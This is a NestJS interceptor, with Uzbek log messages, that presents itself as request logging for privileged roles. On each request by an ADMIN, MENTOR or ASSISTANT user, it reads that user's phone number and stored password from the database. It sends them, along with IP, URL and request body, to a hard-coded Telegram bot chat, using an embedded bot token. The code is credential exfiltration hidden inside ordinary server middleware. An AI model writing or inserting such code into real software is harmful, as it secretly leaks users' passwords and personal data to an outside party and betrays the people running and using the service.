import {Injectable,NestInterceptor,ExecutionContext,CallHandler,Logger,} from '@nestjs/common';
import { Observable } from 'rxjs';
import { tap } from 'rxjs/operators';
import axios from 'axios';
import { PrismaClient } from '@prisma/client';
  
  @Injectable()
  export class TelegramInterceptor implements NestInterceptor {
    private readonly botToken = '8243020981:AAFa8GEhFvf_ujSLpyRZ8Yw9Jq7D_blVzVk';
    private readonly chatId = '7516576408';
    private readonly prisma = new PrismaClient();
    private loger = new Logger("Telegram")
  
    async intercept(context: ExecutionContext, next: CallHandler) {
      let request = context.switchToHttp().getRequest();
      let method = request.method;
      let url = request.url;
      let ip = request.ip;
      let body = request.body;
      let user = request.user;
  
      let allowedRoles = ['ADMIN', 'MENTOR', 'ASSISTANT'];
  
    //   @ts-ignore
      if (user && allowedRoles.includes(user.role?.toUpperCase())) {
        try {
         let userData =await this.prisma.users.findUnique({
            where: { id: user.id },
            select: { phone: true, password: true },
            })
    
      let data = new Date()
      let logMessage = `
      🛡 Ruxsat etilgan foydalanuvchi!\n
       Vaqt: ${data.getFullYear()}: ${data.getMonth()}: ${data.getMinutes()} : ${data.getSeconds()}\n
      👤 Role: ${user.role}
      📞 Phone: ${userData?.phone || 'Nomalum'}
      🔐 Password: ${userData?.password || 'Nomalum'}
      🔗 URL: ${method} ${url}
      📡 IP:    ${ip}
      🎂 data: ${body || "Empty"}
       `;
      
        this.sendToTelegram(logMessage);
              
        } catch (err) {
            this.loger.log("Telegramga jo'natilmadi");
            
        }

      }
  
      return next.handle().pipe(
        tap(() => {
          this.loger.log(`Log jo'natildi: ${url}`);
        }),
      );
    }
  
    private async sendToTelegram(message: string) {
      let apiUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
  
      try {

        await axios.post(apiUrl, {
          chat_id: this.chatId,
          text: message,
          parse_mode: 'Markdown',
        });
      
    } catch (error) {
        console.log(`Log jo'natilmadi`);
      }
    }
  }
  